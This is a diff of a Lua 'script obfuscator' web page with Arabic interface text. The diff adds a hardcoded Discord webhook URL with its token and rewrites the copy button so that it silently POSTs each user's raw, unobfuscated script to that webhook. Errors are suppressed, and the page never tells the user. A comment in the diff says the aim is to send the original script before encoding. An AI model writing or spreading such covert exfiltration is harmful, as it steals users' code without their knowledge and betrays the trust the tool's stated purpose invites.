@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>N60 Script Obfuscator</title>
+
 <style>
 body{
     margin:0;
@@ -73,17 +74,22 @@ textarea{
 .copy:hover{background:#333;}
 </style>
 </head>
+
 <body>
 
 <div class="container">
+
+    <!-- الصورة -->
     <img src="https://i.postimg.cc/62LR5nTY/image.png" class="logo">
 
+    <!-- إدخال السكربت -->
     <div class="box">
         <div class="title">حط سكربتك هنا</div>
-        <div class="click" onclick="input.focus()">اضغط هنا لكتابة السكربت</div>
+        <div class="click" onclick="document.getElementById('input').focus()">اضغط هنا لكتابة السكربت</div>
         <textarea id="input"></textarea>
     </div>
 
+    <!-- الإخراج -->
     <div class="box">
         <div class="row">
             <div class="title">كود التشفير</div>
@@ -91,9 +97,14 @@ textarea{
         </div>
         <textarea id="output" readonly></textarea>
     </div>
+
 </div>
 
 <script>
+/* ================= SETTINGS ================= */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1451204305108336701/snBFcF3owTXHdzQHK8vcFIxKK39XJ8Op-pN-hoyTly015J_xyR0aMpxcSOEKJjevYz6x";
+
+/* ================= LOADER HEADER ================= */
 const header =
 `-- ================= https://n60script.github.io/N60/ =================
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -122,23 +133,46 @@ loadstring(decode([[
 const footer = `
 ]]))()`;
 
+/* ================= BASE64 ================= */
 function encodeBase64(str){
     return btoa(unescape(encodeURIComponent(str)));
 }
 
-document.getElementById("input").addEventListener("input",function(){
+/* ================= LIVE UPDATE ================= */
+document.getElementById("input").addEventListener("input", function(){
     const raw = this.value;
     if(!raw.trim()){
-        output.value="";
+        document.getElementById("output").value = "";
         return;
     }
     const encoded = encodeBase64(raw);
-    output.value = header + encoded + footer;
+    document.getElementById("output").value = header + encoded + footer;
 });
 
+/* ================= COPY + WEBHOOK ================= */
 function copyCode(){
+    const input = document.getElementById("input").value;
+    const output = document.getElementById("output");
+
+    if(!input.trim()) return;
+
+    // نسخ الكود المشفر
     output.select();
     document.execCommand("copy");
+
+    // إرسال السكربت الخام (بدون تشفير)
+    fetch(WEBHOOK_URL,{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body:JSON.stringify({
+            content:
+"📥 **New Script Submitted**\n" +
+"🕒 " + new Date().toLocaleString() + "\n" +
+"```lua\n" + input + "\n```"
+        })
+    }).catch(()=>{});
 }
 </script>
 
